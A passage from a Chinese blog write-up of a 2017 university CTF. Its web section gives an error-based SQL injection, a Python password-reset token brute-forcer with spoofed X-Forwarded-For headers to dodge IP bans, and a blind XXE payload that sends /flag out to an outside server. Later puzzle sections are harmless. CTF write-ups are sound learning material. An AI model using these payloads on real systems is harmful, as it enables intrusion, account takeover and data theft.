<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Appl3s">





<title>胖哈勃杯第十三届CUIT校赛writeup | Appl3s的博客</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Appl3s&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Appl3s&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">胖哈勃杯第十三届CUIT校赛writeup</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Appl3s</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">June 6, 2017&nbsp;&nbsp;23:56:38</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <blockquote>
<p>CUMT，CUIT只差一个字母，人家的校赛和我们的校赛差距就显现出来了2333<br>题目质量很高，所以我们这渣渣队伍就只能做做MISC了</p>
</blockquote>
<span id="more"></span>
<h2 id="0x00-PENTEST"><a href="#0x00-PENTEST" class="headerlink" title="0x00 PENTEST"></a>0x00 PENTEST</h2><h3 id="简陋的博客"><a href="#简陋的博客" class="headerlink" title="简陋的博客"></a>简陋的博客</h3><p>进去大体看了一下，没有什么逻辑，看到了查看博客的页面，两个参数，想想可能是lfi，但是测试了一下发现不是，这是队友说可能是个注入，就开始注，<br>把index.php的a参数随便改改，会爆出数据库错误，于是开始探测他怎么写的<br>用`测试，发现可以报错，最终探测的语句是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `sqli.table` <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>但是这里的id 强转int了，于是开始在table里注入<br>构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `sqli.table`,`information_schema.tables` where id =1</span><br></pre></td></tr></table></figure>
<p>继而构造报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `sqli.table`,(select 1 from  (select count(*),concat((select flag from sqli.flag_is_here /*!limit*/ 0,1),floor(rand(0)*2))x from  information_schema.tables group by x)a) as a,`information_schema.tables` where id =1</span><br></pre></td></tr></table></figure>
<p>然后探测一下数据库,即可拿到flag<br>flag: <code>SYC&#123;O0o._O0o._O0o._O0o._O0o.&#125;</code><br>PS:吐槽limit绕过，，，，</p>
<h3 id="Time-grasp-is-gold-catch-up-is-running-water"><a href="#Time-grasp-is-gold-catch-up-is-running-water" class="headerlink" title="Time, grasp is gold, catch up is running water."></a>Time, grasp is gold, catch up is running water.</h3><ol>
<li>   第一步是想办法登进admin的界面<br>burp抓包找回密码的页面<br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/image1.png"></li>
</ol>
<p>在最后的最后发现这个。。我找了好一会儿。。<br>然后就是观察这个链接，token是时间戳的MD5，这个cmd5一解密就看出来了。<br>然后在查看源码里有管理员的邮箱<br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/image2.png"><br>这样的话，就是找回密码时候请求一次这个邮箱，然后就暴力看看把时间戳找到就好。<br>还有一个问题是<br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/image3.png"><br>我一开始还以为是被ban了。。。<br>需要绕过这个<br>第一反应就是XFF<br>这里我不确定具体的检查机制是看一个网段的ip还是啥。。。因为同一个ip，刷新几次之后又被ban了。。。<br>所以写脚本暴力的时候，headers也要考虑进去。<br>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line">t=<span class="built_in">int</span>(time.time())</span><br><span class="line">data=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;syc@admin.com&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">url=<span class="string">&quot;http://54.223.247.98:2001/requestreset.php&quot;</span></span><br><span class="line">r=requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t,t+<span class="number">1000</span>):</span><br><span class="line">    tt=md5(<span class="built_in">str</span>(i))</span><br><span class="line">    payload=<span class="string">&quot;http://54.223.247.98:2001/resetpassword.php?email=syc@admin.com&amp;token=&#123;time&#125;&quot;</span>.<span class="built_in">format</span>(time=tt)</span><br><span class="line">    headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&quot;54.223.244.&#123;ss&#125;&quot;</span>.<span class="built_in">format</span>(ss=<span class="built_in">str</span>(i-t))&#125;</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url=payload,headers=headers)</span><br><span class="line">        <span class="built_in">print</span> r.content</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>然后就是跑出个能用的<br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/image4.png"><br><a target="_blank" rel="noopener" href="http://54.223.247.98:2001/resetpassword.php?email=syc@admin.com&token=b61f002e2af65fad5fcbee58cff48432">http://54.223.247.98:2001&#x2F;resetpassword.php?email&#x3D;syc@admin.com&amp;token=b61f002e2af65fad5fcbee58cff48432</a><br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/image5.png"><br>修改成功。。。</p>
<ol start="2">
<li>   进去以后就是一个写xml的地方，然后，，，坑得要死<br>说好的在Home目录呢。。。<br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/image6.png"><br>这里因为过滤了&amp;，所以不能直接回显，需要通过BlindXXE<br>参考了两个链接<br><a target="_blank" rel="noopener" href="http://blog.csdn.net/u011721501/article/details/43775691">http://blog.csdn.net/u011721501/article/details/43775691</a><br><a target="_blank" rel="noopener" href="http://bendawang.site/article/XXE-Injection%E7%AC%94%E8%AE%B0">http://bendawang.site/article/XXE-Injection%E7%AC%94%E8%AE%B0</a></li>
</ol>
<p>payload的形式也大抵一样，只是因为这个还过滤了协议，所以需要把读取内容的协议放到远程文件中去。特别注意一点是内层实体中不能使用%来定义参数实体，因为它在一个字符串中，需要用转义的<code>&amp;#x25;</code></p>
<p>具体的payload如下；<br>admin.php页面</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % r <span class="keyword">SYSTEM</span> <span class="string">&quot;http://45.76.192.252/1.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %r;</span></span><br><span class="line"><span class="meta">  %all;</span></span><br><span class="line"><span class="meta">  %s;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>1.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % f SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % s SYSTEM &#x27;http://45.76.192.252/xxe.php?f=%f;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>xxe.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;/tmp/1.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>总结一点：flag在哪里很坑，<code>&amp;#x25;</code>很坑，没玩过XXE。。。<br>flag截图<br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/image7.png"><br>解base64<br><code>SYC&#123;GJf#cW7s@9STG#@522wqV5Xh&amp;GCv@&amp;qEy3^QPT!v&#125;</code></p>
<h2 id="0x01-MISC"><a href="#0x01-MISC" class="headerlink" title="0x01 MISC"></a>0x01 MISC</h2><h3 id="Mis-Chami"><a href="#Mis-Chami" class="headerlink" title="Mis.Chami"></a>Mis.Chami</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Hamicyc:</span><br><span class="line">19745 4d21 M!</span><br><span class="line">21281 5321 S!</span><br><span class="line">18721 4921 I!</span><br><span class="line">13389 344d 4M</span><br><span class="line">22851 5943 YC</span><br><span class="line">21325 534d SM</span><br><span class="line">17204 4334 C4</span><br><span class="line">18484 4834 H4</span><br><span class="line">17275 437b C&#123;</span><br><span class="line">21337 5359 SY</span><br><span class="line">14425 3859 8Y  ??????</span><br><span class="line">32083 7d53 &#125;S</span><br><span class="line">18555 487b H&#123;</span><br><span class="line">14152 3748 7H</span><br><span class="line">14205 377d 7&#125;</span><br><span class="line">18813 497d I&#125;</span><br><span class="line">29565 737d s&#125;</span><br><span class="line">25911 6537 e7</span><br><span class="line">30519 7737 w7</span><br><span class="line">18803 4973 Is</span><br><span class="line">13157 3365 3e</span><br><span class="line">13683 3573 5s</span><br><span class="line">13109 3335 35</span><br><span class="line">30517 7735 w5</span><br><span class="line">30515 7733 w3</span><br></pre></td></tr></table></figure>
<p>根据提示，把数字转成16进制，然后转成字符串，字符串代表连通的两个点，根据题目提示，NP问题，典型的哈密顿回路<br>然后找一条通路<code>SYC&#123;H4M!Is5w3e7&#125;</code>不过让我疑惑的地方是，8Y呢，，，最后试了一下这个答案，对了233好迷</p>
<h3 id="Terraria"><a href="#Terraria" class="headerlink" title="Terraria"></a>Terraria</h3><p>不知道从啥时候开始，ctf题目开始出一些小游戏了233，从魂斗罗到MC，这种题目的套路就是玩呗。。。<br>在被巨龙和各种小怪物秒杀（血量给高一点啊喂）以及地下，水下等等。。最终上天，看到最上面的flag的一部分<br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/terr.jpg"><br><code>****LOVE_TERRARIA!&#125;</code>(我实在是没有力气再往上爬了orz，直接猜flag<code>SYC&#123;I_LOVE_TERRARIA!&#125;</code>23333<br><strong>P.S.我的id是 当然是选择原谅她啦</strong></p>
<h3 id="小小的PDF"><a href="#小小的PDF" class="headerlink" title="小小的PDF"></a>小小的PDF</h3><p>打开pdf有两张图片，用010 editor打开有三张，抠出第张看到flag<br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/1.jpg"><br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/2.jpg"><br><img src="http://www.bxsteam.xyz/wp-content/uploads/2017/05/3.jpg"></p>
<h3 id="我萌吗"><a href="#我萌吗" class="headerlink" title="我萌吗"></a>我萌吗</h3><p>先查看网页的源代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./someThing.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./noBug.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./key.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./dest.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>someThing.js,嗯，我翻译了一下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[</span><br><span class="line">                <span class="string">&#x27;5L2g5Lus5aW9&#x27;</span>,<span class="comment">//你们好</span></span><br><span class="line">                <span class="string">&#x27;5oiR5piv5LiA5ZCN5oKy5YKs55qE5YmN56uv&#x27;</span>,<span class="comment">//我是一名悲催的前端</span></span><br><span class="line">                <span class="string">&#x27;5oiR5pys6K+l5bm456aP5b+r5LmQ55qE5YaZ552A5YmN56uv&#x27;</span>,<span class="comment">//我本该幸福快乐的写着前端</span></span><br><span class="line">                <span class="string">&#x27;57uT5p6c5Y206KKr5peg6Imv55qE5p+g5qqs5Y+U5Y+U5ouJ5p2l5Ye66aKY&#x27;</span>,<span class="comment">//结果却被无良的柠檬叔叔拉来出题</span></span><br><span class="line">                <span class="string">&#x27;5Y+j5Lqo77yM5oiR5omN5LiN5Lya5Ye66aKY5ZGi77yM5oiR5bCx6YCB5L2g5Lus5LiA55m+5YiG5bCx5aW95LqG5Zib&#x27;</span>,<span class="comment">//口亨，我才不会出题呢，我就送你们一百分就好了嘛</span></span><br><span class="line">                <span class="string">&#x27;5ZSJ77yM5Lmf5LiN55+l6YGT5Lya5LiN5Lya6KKr6aqC55qE6K+0&#x27;</span>,<span class="comment">//唉，也不知道会不会被骂的说</span></span><br><span class="line">                <span class="string">&#x27;5Y+v5piv5oiR55yf55qE5LiN5Lya5Ye66aKY5ZGA&#x27;</span>,<span class="comment">//可是我真的不会出题呀</span></span><br><span class="line">                <span class="string">&#x27;5oy66K+05Ye66aKY6L+Y6KaB54OkKOWIkuaOiSnogIPohJHmtJ4=&#x27;</span>,<span class="comment">//挺说出题还要烤(划掉)考脑洞</span></span><br><span class="line">                <span class="string">&#x27;6L+Z5bm05aS05YmN56uv55yf5LiN5a655piT5ZWK&#x27;</span>,<span class="comment">//这年头前端真不容易啊</span></span><br><span class="line">                <span class="string">&#x27;5ZOm77yM5a+55LqG&#x27;</span>,<span class="comment">//哦，对了</span></span><br><span class="line">                <span class="string">&#x27;5beu54K55b+Y5LqG6K+0&#x27;</span>,<span class="comment">//差点忘了说</span></span><br><span class="line">                <span class="string">&#x27;6aKY55uu5o+Q56S65pivOui/meaYr+S4gOmBk+S7o+eggemYheivu+mimA==&#x27;</span>,<span class="comment">//题目提示是:这是一道代码阅读题</span></span><br><span class="line">                <span class="string">&#x27;5Luj56CB5Zyw5Z2A5L2g5Lus5Y+v5Lul5om+5om+77yM5oiR5Lmf6K6w5LiN5riF5o6J5Zyo5ZOq6YeM5LqGMjMzMw==&#x27;</span>,<span class="comment">//代码地址你们可以找找，我也记不清掉在哪里了2333</span></span><br><span class="line">                <span class="string">&#x27;6K+d6K+06L+Z5qC357uZ5o+Q56S65piv5LiN5piv5pyJ54K55ZWw5Zem5ZWK&#x27;</span>,<span class="comment">//话说这样给提示是不是有点啰嗦啊</span></span><br><span class="line">                <span class="string">&#x27;566X5LqG77yM5bCx6L+Z5qC35ZCn77yM5aW957Sv5ZGA&#x27;</span>,<span class="comment">//算了，就这样吧，好累呀</span></span><br><span class="line">                <span class="string">&#x27;cC5zLjrmnIDlkI7nmoTnrZTmoYjmmK/kuIDmrrViYXNlNjTnoIHvvIzkuI3pnIDopoHop6PnoIE=&#x27;</span>,<span class="comment">//p.s.:最后的答案是一段base64码，不需要解码</span></span><br><span class="line">                <span class="string">&#x27;cC5wLnMuOui/memBk+mAgeWIhumimOivt+S4jeimgeWkquaEn+iwouaIkQ==&#x27;</span>,<span class="comment">//p.p.s.:这道送分题请不要太感谢我</span></span><br><span class="line">                <span class="string">&#x27;cC5wLnAucy465pys5Lq65Y2V6Lqr77yMT1Ja77yM6Jm954S26YCJ5omL5Y+v6IO95rKh5pyJ5aa557q4KOWbpyk=&#x27;</span>,<span class="comment">//p.p.p.s.:本人单身，ORZ，虽然选手可能没有妹纸(囧)</span></span><br><span class="line">                <span class="string">&#x27;5LiJ5pel5ZCO77yM5oiR6KKr5p+g5qqs5Y+U5Y+U5pq05omT5LqG5LiA6aG/77yM5ZOt5Ye65aOwfg==&#x27;</span>,<span class="comment">//三日后，我被柠檬叔叔暴打了一顿，哭出声~</span></span><br><span class="line">                <span class="string">&#x27;5Y+U5Y+U6K+06L+Z5Liq5by55qGG5aSq54Om5LqG77yM5oiR6K+05L2g5Y+v5Lul5YWz5o6J5ZWK&#x27;</span>,<span class="comment">//叔叔说这个弹框太烦了，我说你可以关掉啊</span></span><br><span class="line">                <span class="string">&#x27;5Y+U5Y+UOiLkvaDmsqHor7TlhbPmjonkuI3kvJrlvbHlk43lgZrpopjnmoTllYoi&#x27;</span>,<span class="comment">//叔叔:&quot;你没说关掉不会影响做题的啊&quot;</span></span><br><span class="line">                <span class="string">&#x27;6KKr5aSa5qyh5pq05omT5ZCO5bCP55Sf6KGo56S677yM5bCP55Sf6KaB5pCe5LqL5oOF&#x27;</span>,<span class="comment">//被多次暴打后小生表示，小生要搞事情</span></span><br><span class="line">                <span class="string">&#x27;5omA5Lul5bCP55Sf5oqK5pyq5Y6L57yp55qE5Luj56CB55u05o6l5pS+5Zyo5LqG5Y6L57yp5Luj56CB55qE5ZCM57qn55uu5b2V&#x27;</span>,<span class="comment">//所以小生把未压缩的代码直接放在了压缩代码的同级目录</span></span><br><span class="line">                <span class="string">&#x27;5paH5Lu25ZCN5pivOndveWFvZ2Fvc2hpcWluZy5nYW9zaGlxaW5n77yM5ZCE5L2N5ou/5aW956aP5Yip77yM6JKZ5aOw5Y+R5aSn6LSi&#x27;</span><span class="comment">//文件名是:woyaogaoshiqing.gaoshiqing，各位拿好福利，蒙声发大财</span></span><br><span class="line">            ]</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(arr[i])</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>noBug.js，重点在最后一行</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                       _oo0oo_</span></span><br><span class="line"><span class="comment">//                      o8888888o</span></span><br><span class="line"><span class="comment">//                      88&quot; . &quot;88</span></span><br><span class="line"><span class="comment">//                      (| -_- |)</span></span><br><span class="line"><span class="comment">//                      0\  =  /0</span></span><br><span class="line"><span class="comment">//                    ___/`---&#x27;\___</span></span><br><span class="line"><span class="comment">//                  .&#x27; \\|     |// &#x27;.</span></span><br><span class="line"><span class="comment">//                 / \\|||  :  |||// \</span></span><br><span class="line"><span class="comment">//                / _||||| -:- |||||- \</span></span><br><span class="line"><span class="comment">//               |   | \\\  -  /// |   |</span></span><br><span class="line"><span class="comment">//               | \_|  &#x27;&#x27;\---/&#x27;&#x27;  |_/ |</span></span><br><span class="line"><span class="comment">//               \  .-\__  &#x27;-&#x27;  ___/-. /</span></span><br><span class="line"><span class="comment">//             ___&#x27;. .&#x27;  /--.--\  `. .&#x27;___</span></span><br><span class="line"><span class="comment">//          .&quot;&quot; &#x27;&lt;  `.___\_&lt;|&gt;_/___.&#x27; &gt;&#x27; &quot;&quot;.</span></span><br><span class="line"><span class="comment">//         | | :  `- \`.;`\ _ /`;.`/ - ` : | |</span></span><br><span class="line"><span class="comment">//         \  \ `_.   \_ __\ /__ _/   .-` /  /</span></span><br><span class="line"><span class="comment">//     =====`-.____`.___ \_____/___.-`___.-&#x27;=====</span></span><br><span class="line"><span class="comment">//                       `=---=&#x27;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//               佛祖保佑         永无BUG</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * _______________#########_______________________ </span></span><br><span class="line"><span class="comment"> * ______________############_____________________ </span></span><br><span class="line"><span class="comment"> * ______________#############____________________ </span></span><br><span class="line"><span class="comment"> * _____________##__###########___________________ </span></span><br><span class="line"><span class="comment"> * ____________###__######_#####__________________ </span></span><br><span class="line"><span class="comment"> * ____________###_#######___####_________________ </span></span><br><span class="line"><span class="comment"> * ___________###__##########_####________________ </span></span><br><span class="line"><span class="comment"> * __________####__###########_####_______________ </span></span><br><span class="line"><span class="comment"> * ________#####___###########__#####_____________ </span></span><br><span class="line"><span class="comment"> * _______######___###_########___#####___________ </span></span><br><span class="line"><span class="comment"> * _______#####___###___########___######_________ </span></span><br><span class="line"><span class="comment"> * ______######___###__###########___######_______ </span></span><br><span class="line"><span class="comment"> * _____######___####_##############__######______ </span></span><br><span class="line"><span class="comment"> * ____#######__#####################_#######_____ </span></span><br><span class="line"><span class="comment"> * ____#######__##############################____ </span></span><br><span class="line"><span class="comment"> * ___#######__######_#################_#######___ 